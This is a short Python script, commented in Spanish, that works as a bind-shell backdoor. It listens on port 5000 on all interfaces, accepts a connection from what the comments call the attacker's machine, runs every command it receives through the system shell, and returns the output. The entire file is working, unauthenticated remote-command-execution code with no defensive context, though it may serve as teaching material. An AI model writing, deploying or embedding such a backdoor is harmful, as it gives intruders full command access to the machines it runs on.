from socket import socket
from subprocess import getoutput
from os import chdir, getcwd
from time import sleep

# Definimos la dirección y puerto, la direcion 0.0.0.0 hace referencia a que aceptamos conexiones de cualquier interfaz
server_address = ('0.0.0.0', 5000)

# Creamos el socket (la conexión)
server_socket = socket()

# Le pasamos la tupla donde especificamos donde escuchar
server_socket.bind(server_address)

# Cantidad de clientes maximos que se pueden conectar:
server_socket.listen(1)

# Esperamos a recibir una conexión y acceptarla:
client_socket, client_address = server_socket.accept()

estado = True

while estado:
    # Recibimos el comando de la máquina atacante
    comando = client_socket.recv(4096).decode()

    # Si el cliente envía "exit", cerramos la conexión y salimos del bucle
    if comando == 'exit':
        # Cerramos la conexión con el cliente
        client_socket.close()
        # Cerramos el socket servidor
        server_socket.close()
        estado = False
    
    elif comando.split(" ")[0] == 'cd':
        # Cambiamos de directorio de trabajo
        chdir(" ".join(comando.split(" ")[1:]))
        client_socket.send("ruta actual: {}".format(getcwd()).encode())
    
    else :
        # Ejecutamos el comando y obtenemos su salida:
        salida = getoutput(comando)

        # Enviamos la salida a la máquina atacante
        client_socket.send(salida.encode())
    
    sleep(0.1)